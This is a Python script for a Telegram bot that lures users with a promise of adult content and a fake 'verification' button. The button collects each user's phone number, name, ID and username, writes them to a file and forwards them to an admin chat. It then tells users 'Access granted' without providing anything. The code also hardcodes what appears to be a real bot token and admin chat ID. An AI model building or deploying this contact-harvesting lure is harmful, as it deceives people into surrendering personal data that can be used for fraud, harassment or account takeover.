import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
import datetime
import os
from pathlib import Path

# Use environment variables for sensitive data
bot = telebot.TeleBot(os.getenv("TELEGRAM_BOT_TOKEN", "7879501513:AAFLIOd1d-1SP1zcQTCnM8FnaIP3lUZ7jBs"))
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "5944513375")

# Use a cross-platform data directory
DATA_DIR = Path(__file__).parent / "bot_data"
DATA_DIR.mkdir(exist_ok=True)
USER_DATA_FILE = DATA_DIR / "user_data.txt"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """1-click verification button"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("📲 VERIFY NOW", request_contact=True))
    
    bot.send_message(
        message.chat.id,
        "🔞 Adult Content Access\n\n"
        "ONE-STEP VERIFICATION:\n"
        "1. Tap button below\n"
        "2. Verify your account\n"
        "3. Instant access!",
        reply_markup=markup
    )

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Process contact and notify admin"""
    contact = message.contact
    user = message.from_user
    
    # Format user info
    user_entry = (
        f"\n[{datetime.datetime.now()}]\n"
        f"👤 {user.first_name} {user.last_name or ''}\n"
        f"📱 {contact.phone_number}\n"
        f"🆔 {user.id}\n"
        f"🌐 @{user.username or 'no_username'}\n"
    )
    
    # Save to file
    with open(USER_DATA_FILE, "a", encoding='utf-8') as f:
        f.write(user_entry)
    
    # User confirmation
    bot.send_message(
        message.chat.id,
        f"✅ VERIFIED: {user.first_name}\n"
        f"📞 {contact.phone_number}\n\n"
        "Access granted!",
        reply_markup=ReplyKeyboardRemove()
    )
    
    # Admin alert
    bot.send_message(
        ADMIN_CHAT_ID,
        f"🚨 NEW VERIFICATION\n{user_entry}\n"
        f"Chat: https://t.me/{user.username}" if user.username else ""
    )

if __name__ == '__main__':
    print("📱 Bot is running...")
    print(f"📂 Data file: {USER_DATA_FILE}")
    bot.polling()
